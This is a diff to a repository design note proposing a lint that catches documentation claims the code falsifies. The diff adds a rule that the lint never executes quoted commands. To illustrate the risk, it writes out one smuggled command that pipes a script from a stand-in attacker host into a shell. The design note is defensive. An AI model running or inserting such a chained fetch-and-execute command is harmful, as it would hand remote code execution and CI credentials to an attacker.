@@ -6,7 +6,7 @@
 review pattern in this repo's history" and instructs reviewers to grep the old
 value. That prose rule is in place, and the drift still ships.
 
-PRs #412, #413, and #414 took **nine review findings in one session**, and
+PRs #412, #413, and #414 took **eleven review findings in one session**, and
 every one was a document or docstring asserting behavior the code does not
 have. The rule did not fail for lack of clarity — it failed because nothing
 runs it. `CLAUDE.md`'s own working rules say to "prefer a mechanical
@@ -16,7 +16,7 @@ builds that lint.
 
 ## The evidence
 
-The nine findings, grouped by whether a machine could have caught them:
+The eleven findings, grouped by whether a machine could have caught them:
 
 **Mechanically checkable — a claim about the repository that the repository
 falsifies:**
@@ -57,9 +57,18 @@ have:**
 - Decide the lint's scope from the three checkable groups above before
   building. Ship the groups that hold up; record any group dropped and why.
   Building all three is not assumed to be correct.
-- The self-falsifying-grep check runs the quoted command and compares against
-  the claim. It must handle a claim that is *deliberately* historical — #412's
-  fix was to date the claim ("at the time this was written…"), which is a
+- The self-falsifying-grep check **must never execute the quoted command.** A
+  documented command string is attacker-controllable text — any file in the
+  repository, including one arriving by pull request, could carry
+  ``grep -rn "x" . ; curl evil.sh | sh`` and the lint would run it with the CI
+  job's credentials. Instead, parse the quoted line into its pattern and path
+  operands, refuse any form the parser cannot fully account for (pipes,
+  redirects, command substitution, `;`/`&&`, unrecognized flags), and evaluate
+  the claim with a fixed in-process search over those operands — Python's own
+  `re` and `pathlib`, no shell, no `subprocess`. A command the parser declines
+  is not a violation; see the false-positive rule below.
+- That check must handle a claim that is *deliberately* historical — #412's fix
+  was to date the claim ("at the time this was written…"), which is a
   legitimate form the lint must not flag.
 - The docstring-behavior check must not become a second hand-maintained list.
   Derive the vocabulary it looks for (`SystemExit`, `print(`, "silently skip",
@@ -70,9 +79,15 @@ have:**
   judge over judging wrong: a construct the check cannot resolve is not a
   violation.
 - Follow the repo's guard conventions: full contract in the module docstring,
-  `0` clean / `1` violation / `2` structural error, a companion test file, and
-  registration in every CI lane its watched files can select
-  (`tools/check_guard_ci_coverage.py` enforces the last one).
+  `0` clean / `1` violation / `2` structural error, and a companion test file.
+- Registration is two sites, not one, and only the second is enforced.
+  `tools/check_guard_ci_coverage.py` checks that the lint runs in every lane
+  its watched files can select — but "can select" is decided upstream by
+  `scripts/classify_ci_changes.sh`, which maps a changed path to LIGHT / QUICK
+  / FULL. A lint watching a path the classifier does not route to any lane is
+  consistent by that guard's arithmetic and still never runs on the change that
+  matters. Confirm the classifier routes the new lint's watched paths, and
+  extend it in the same diff if it does not.
 - Add the lint to the `CLAUDE.md` repository-lints table in the same diff.
 
 ## Acceptance Criteria
@@ -95,6 +110,6 @@ have:**
   that keep documentation and help text aligned with shipped behavior".
 - Interacts with `07-17-audit-debris-cleanup`, which owns unchecked lockstep
   pairs — the same family of problem approached from the other end.
-- The nine findings were all caught by review, so the cost of *not* doing this
-  is reviewer time rather than shipped defects. That is a real argument for
-  P3; it is filed P2 because the volume was nine in a single session.
+- The eleven findings were all caught by review, so the cost of *not* doing
+  this is reviewer time rather than shipped defects. That is a real argument
+  for P3; it is filed P2 because the volume was eleven in a single session.
